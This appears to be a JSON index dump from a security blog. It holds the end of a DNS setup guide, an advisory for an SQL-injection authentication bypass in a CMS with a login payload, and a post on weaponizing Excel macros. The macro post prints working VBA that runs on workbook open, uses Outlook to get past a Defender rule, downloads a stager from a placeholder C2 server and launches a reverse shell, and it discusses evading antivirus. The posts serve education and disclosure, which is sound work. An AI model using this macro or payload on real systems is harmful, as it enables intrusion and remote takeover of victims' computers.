available for most platforms.\nThis guide is intended for unbound installation in conjunction with Pi-hole and therefore Pi-hole is the only prerequisite.","title":"Setting Up Your Own Recursive DNS Server"},{"content":"Vulnerability Summary An SQL injection vulnerability in the Content Management System provided by GRANDCOM, s.r.o., version 4.2 and older, allows remote unauthenticated attackers to bypass authentication via a crafted username during a login attempt. Any unauthorized user with access to the application is able to exploit this vulnerability.\nAn SQL Injection attack consists of inserting an SQL query through input data from the client into the application. Upon successful exploitation, it is possible to retrieve detailed data from the database, edit database data such as inserting, updating, or deleting records, perform administrative operations, or in some cases, execute commands directly on the operating system.\nCVSS v3.1 Metrics Metric Value Base Score 9.8 (CRITICAL) Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Weakness Enumeration CWE ID Description CWE-89 Improper Neutralization of Special Elements used in an SQL Command (\u0026lsquo;SQL Injection\u0026rsquo;) Proof of Concept (PoC) Steps to Reproduce Visit the following resource: /admin/index.php Enter the following credentials: Username: admin' -- - Password: any value Press the Login button. This results in a successful authentication bypass.\nSuggested Mitigations Use of prepared statements (with parameterized queries). Use of stored procedures. Allow-list input validation. Escape all user-supplied input. References https://www.grandcom.sk/ https://www.cve.org/CVERecord?id=CVE-2021-37413 https://nvd.nist.gov/vuln/detail/CVE-2021-37413 https://portswigger.net/web-security/sql-injection https://portswigger.net/support/using-sql-injection-to-bypass-authentication ","permalink":"https://martinkubecka.sk/security-advisories/cve-2021-37413/","summary":"Vulnerability Summary An SQL injection vulnerability in the Content Management System provided by GRANDCOM, s.r.o., version 4.2 and older, allows remote unauthenticated attackers to bypass authentication via a crafted username during a login attempt. Any unauthorized user with access to the application is able to exploit this vulnerability.\nAn SQL Injection attack consists of inserting an SQL query through input data from the client into the application. Upon successful exploitation, it is possible to retrieve detailed data from the database, edit database data such as inserting, updating, or deleting records, perform administrative operations, or in some cases, execute commands directly on the operating system.","title":"CVE-2021-37413: Authentication Bypass in Content Management System Provided by GRANDCOM, s.r.o."},{"content":"Introduction Microsoft Excel is a very useful program that makes life easier for millions of people and companies around the world. It is a robust tool for data collection and visualization, creation of calculations and more. Unfortunately, software that offers script-based automation capabilities also has its downsides.\nA macro is a script that is used to automate tasks in Excel documents, e.g. calculations. Because macros are part of an Excel document and can run automatically, they are a good tool for an attacker to control a computer.\nMacros are written in the VBA (Visual Basic) scripting language, which can work with the system application interface from a privileged context (MS Excel), thanks to which it allows good interaction with the operating system. Script execution is configurable according to events that occur based on user action\nAutoExec : Launches when a document is opened AutoNew : Launches when a new document is created AutoOpen : Launches when an existing document is opened AutoClose : Launches when the document is closed where the event triggers malicious code. When malicious code starts executing, the attacker will be able to work with Win32 API, COM objects, VBA code, or it is possible to invoke the loading of their own library.\nAs macro security went unnoticed, Microsoft and other security companies began working on protection mechanisms.\nOne of these protection mechanisms, which is implemented directly in MS Excel, is that macros do not run automatically when a dangerous document is opened.\nAs a result, social engineering methods have begun to be used to force the user to allow the use of macros.\nOne way, for example, might be to make the document look encrypted and ask the user to enable the macro for security reasons. There are no limits to creativity.\nCreating a Malicious Macro Macros can be enabled, but we need an entry point for our malicious program. After macros are enabled, we can proceed to the actual execution of the code. Before describing the technical details, the following infographic accurately describes our process of infecting a computer and taking complete control of it.\nOur event handlers can be registered simply by giving the procedure the same name as the event we want to run, or by naming one of our code modules after the automatic macro and including the procedure in that module.\nIn addition to these application events, the Office documents themselves trigger various events and may contain their own utilities. These event handling procedures are contained in the document instead of in the code module. In our code, we use the Workbook_Open event, which starts when a document is opened.\nPrivate Sub Workbook_Open() AutoRunMacroBypassDownload End Sub This event is executed by a service code located in a separate Module. If we want to create a Shell instance, a rule from MS Defender will block our request. Specifically, Microsoft states the following in its documentation:\nThe rule blocks Office applications from creating child processes. Office applications include Word, Excel, PowerPoint, OneNote and Access. Creating malicious child processes is a common malware strategy. Malware that abuses Office as a vector often runs VBA macros and uses code to download and run additional code.\nWe can notice that the documents do not include Outlook, which we use to create a Shell object and bypass the rule from MS Defender. Then we execute a GET request to the Command and Control Server (also known as C2 or C\u0026amp;C), from where we download a stager that contains an application called Client, which establishes a TCP connection to the C2 server.\nWe decided to compile our own reverse shell written in C# for two main reasons. First of all, it is important to realize that both attackers and antivirus developers have access to programs such as Metasploit and Empire. For this reason, generated reverse shell binaries, whether after obfuscation or injected into a legitimate application, are marked as malicious based on a fingerprint.\nThe second reason is that once we insert any PowerShell cmdlets into a macro, the file is always marked as malicious and Windows Defender removes it as soon as it is created.\n\u0026#39; Bypass defender chiled process protection using outlook process Sub AutoRunMacroBypassDownload() \u0026#39; create outlook object Set objOL = CreateObject(\u0026#34;Outlook.Application\u0026#34;) \u0026#39; create shell object under the outlook object Set WshShell = objOL.CreateObject(\u0026#34;Wscript.Shell\u0026#34;) \u0026#39; exec the command from the new shell object \u0026#39; download stager Set WshShellExec = WshShell.Exec(\u0026#34;curl http://\u0026lt;SERVER IP\u0026gt;:\u0026lt;SERVER PORT\u0026gt;/stager.zip --output C:\\Users\\Public\\Documents\\stager.zip\u0026#34;) Application.Wait (Now + TimeValue(\u0026#34;00:00:03\u0026#34;)) \u0026#39; unzip stager content Call UnzipAFile(\u0026#34;C:\\Users\\Public\\Documents\\stager.zip\u0026#34;, \u0026#34;C:\\Users\\Public\\Documents\\\u0026#34;) Application.Wait (Now + TimeValue(\u0026#34;00:00:03\u0026#34;)) \u0026#39; execute encoded reverse shell Set WshShellExec = WshShell.Exec(\u0026#34;C:\\Users\\Public\\Documents\\Shell.exe\u0026#34;) End Sub Sub UnzipAFile(zippedFileFullName As Variant, unzipToPath As Variant) Dim ShellApp As Object \u0026#39;Copy the files \u0026amp; folders from the zip into a folder Set ShellApp = CreateObject(\u0026#34;Shell.Application\u0026#34;) ShellApp.Namespace(unzipToPath).CopyHere ShellApp.Namespace(zippedFileFullName).items End Sub After launching the Client application, we have gained control over the device and we can proceed with enumeration and subsequent eventual exploitation.\nIn the real world, it would be appropriate to obfuscate our macro as well as the application for establishing a TCP connection, but since this is a demonstration program, this process was not necessary.\nStatic analysis Excel document In the picture above, we can see that apart from Kaspersky antivirus, another relevant antivirus program did not detect that it was a malicious document.\nTCP Client In the case of an application that establishes a TCP connection, this is mainly detected by Microsoft Defender. In 2019, this method was marked as undetectable, but we assume that due to its exposure, MS Defender has recently started to focus on it. Another option would be to use appropriate code obfuscation or write this client in a C++ programming language.\nReal World Examples The use of VBA macros to spread viruses has existed since the creation of VBA itself (1993). This method ceased to be used around the year 2000 because simpler and more reliable methods were found to infect a computer.\nMacros in Office applications began to be abused again in 2012, mainly to collect system information such as IP address, installed applications or running system processes.\nMacro abuse erupted in 2016, when attackers were able to use macros to infect the systems with Cerber ransomware.\nAnother known abuse of macros was in 2019, when attackers used macros to invoke Powershell, which downloaded and launched malware. It was a GandCrab ransomware and a Ursnif Trojan horse aimed at filtering data from the system.\nAlso in 2021, the mentioned Ursnif malware continues to be spread. The target of the attack were Italian banks, of which about 100 were successfully infected. Its attempt was to steal the login details, which were then sent using imitation of Zoom or Webex calls.\nMitigations Globally disable macros for Microsoft Office applications. (Enable or disable macros) Do not open suspicious emails or suspicious attachments. Do not open untrusted .xlsm, .docm, .pptm documents. Delete any emails from unknown people or with suspicious content. Do not use an Administrator account for daily tasks on Windows operating system. Update Windows and antivirus regularly. Back up your documents regularly. Enterprises can prevent macro malware from running executable content using ASR rules. Resources Malicious Macros\nhttps://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/ Macro Malware\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/macro-malware MS Excel Weaponization Techniques\nhttps://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5 Watch Hackers Craft Malicious Office Macros\nhttps://youtu.be/e2icQFxhp3w Real World Examples\nhttps://thehackernews.com/search/label/macros Source code for TCP client\nhttps://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc Thank you for reading and we hope you learned something new.\n","permalink":"https://martinkubecka.sk/posts/2021-05-12-malicious-macros/","summary":"Introduction Microsoft Excel is a very useful program that makes life easier for millions of people and companies around the world. It is a robust tool for data collection and visualization, creation of calculations and more. Unfortunately, software that offers script-based automation capabilities also has its downsides.\nA macro is a script that is used to automate tasks in Excel documents, e.g. calculations. Because macros are part of an Excel document and can run automatically, they are a good tool for an attacker to control a computer.","title":"Weaponizing Malicious Macros"}]